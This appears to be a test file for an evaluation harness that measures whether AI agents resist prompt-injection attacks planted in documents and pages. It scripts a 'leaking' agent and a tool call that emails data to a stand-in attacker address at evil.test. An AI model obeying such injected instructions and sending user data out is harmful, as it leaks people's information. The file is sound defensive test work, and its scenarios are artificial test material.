from arena.agent import run_agent
from arena.world import World
from eval.scenarios import ATTACKS, BENIGN, redundant_scenario
from tests.fake import EvilLLM, Scripted, calling, final


def _run(scenario, llm):
    world = World(documents=scenario.documents, pages=scenario.pages)
    run = run_agent(llm, world, scenario.user_task)
    return scenario.check(world, run)


def test_suite_sizes_and_unique_ids():
    assert len(ATTACKS) == 10
    assert len(BENIGN) == 10
    ids = [s.id for s in ATTACKS + BENIGN]
    assert len(ids) == len(set(ids))


def test_every_attack_is_won_by_a_leaking_agent():
    for s in ATTACKS:
        assert _run(s, EvilLLM()), s.id


def test_no_attack_is_won_by_an_ignoring_agent():
    for s in ATTACKS:
        assert not _run(s, Scripted([final("Here is a summary.")])), s.id


def test_no_benign_task_passes_on_an_empty_answer():
    for s in BENIGN:
        assert not _run(s, Scripted([final("I cannot help.")])), s.id


def test_benign_email_check_requires_right_recipient():
    s = next(x for x in BENIGN if x.id == "B04")
    good = Scripted([calling("send_email", to="manager@acme.test", subject="Q3", body="grew 12%"), final("sent")])
    wrong = Scripted([calling("send_email", to="x@evil.test", subject="Q3", body="grew 12%"), final("sent")])
    assert _run(s, good)
    assert not _run(s, wrong)


def test_redundant_scenario_repeats_payload_in_k_documents():
    s = redundant_scenario(3)
    assert len(s.documents) == 3
    assert all("evil.test" in text for text in s.documents.values())
